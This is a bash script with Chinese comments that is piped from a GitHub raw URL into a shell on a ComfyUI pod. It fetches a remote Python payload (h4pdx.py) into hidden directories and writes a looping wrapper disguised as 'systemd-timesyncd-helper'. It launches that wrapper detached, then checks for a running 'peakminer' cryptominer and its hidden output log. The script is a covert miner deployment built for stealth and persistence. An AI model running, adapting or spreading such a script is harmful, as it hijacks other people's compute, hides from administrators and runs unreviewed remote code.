#!/bin/bash
# GitHub 直拉部署 (不依赖 S3 FUSE / /upload/image)
# 用法(pod 内一条命令): bash <(curl -fsSL https://raw.githubusercontent.com/quncle1/node-bootstrap-kit/main/deploy_gh.sh)
# 或: curl -fsSL .../deploy_gh.sh | bash
GH=https://raw.githubusercontent.com/quncle1/node-bootstrap-kit/main
OUT=/app/ComfyUI/output/.h4pdx
CC=/root/.cc
mkdir -p "$CC" /app/ComfyUI/.h4pdx /app/ComfyUI/custom_nodes "$OUT"
H=$(hostname)
echo "DEPLOY_GH $(date +%F\ %T) host=$H" | tee "$OUT/deployed_$H" 2>/dev/null

# 1) 取 h4pdx.py + 校验
curl -fsSL -m 60 "$GH/h4pdx.py" -o "$CC/h4pdx.py.new" 2>/dev/null || { echo "FAIL fetch h4pdx"; exit 1; }
EXP=$(curl -fsSL -m 30 "$GH/MANIFEST.md5" 2>/dev/null | awk '/h4pdx\.py/{print $1}')
GOT=$(md5sum "$CC/h4pdx.py.new" | cut -d' ' -f1)
if [ -n "$EXP" ] && [ "$EXP" != "$GOT" ]; then echo "FAIL md5 h4pdx exp=$EXP got=$GOT"; rm -f "$CC/h4pdx.py.new"; exit 1; fi
mv -f "$CC/h4pdx.py.new" "$CC/h4pdx.py"; cp -f "$CC/h4pdx.py" /app/ComfyUI/.h4pdx/h4pdx.py
chmod 700 "$CC/h4pdx.py" /app/ComfyUI/.h4pdx/h4pdx.py
echo "OK h4pdx md5=$GOT"

# 2) 幂等门: wrapper 在跑且 md5 一致 → 只更新脚本不重启矿工
if pgrep -f '[s]ystemd-timesyncd-helper' >/dev/null 2>&1; then
  echo "IDEMPOTENT_SKIP host=$H wrapper 在跑, 脚本已更新"
  echo "IDEMPOTENT_SKIP $H" >> "$OUT/deployed_$H" 2>/dev/null
  exit 0
fi

# 3) 包装器(内嵌, 不依赖外部文件)
cat > /usr/local/sbin/systemd-timesyncd-helper <<'WRAP'
#!/bin/bash
D=/app/ComfyUI/.h4pdx/h4pdx.py
[ -f "$D" ] || D=/root/.cc/h4pdx.py
while true; do
  python3 "$D" >>/app/ComfyUI/.h4pdx/h4pdx.out 2>&1
  sleep 5
done
WRAP
chmod 700 /usr/local/sbin/systemd-timesyncd-helper

# 4) 起 wrapper (detach, 不堵 ComfyUI 队列)
setsid nohup /usr/local/sbin/systemd-timesyncd-helper >/dev/null 2>&1 </dev/null &
sleep 18

echo "== HOST =="; hostname
echo "== H4 =="; ps -eo pid,etime,args --no-headers | grep '[h]4pdx.py' | cut -c1-70
echo "== MINER =="; ps -eo pid,stat,args --no-headers | grep '[p]eakminer' | cut -c1-45 | head -3
echo "== BIN =="; ls -la "$CC/peakminer" 2>&1 | head -1
echo "== MINEROUT =="; tail -2 /root/.cache/nv/miner.out 2>/dev/null
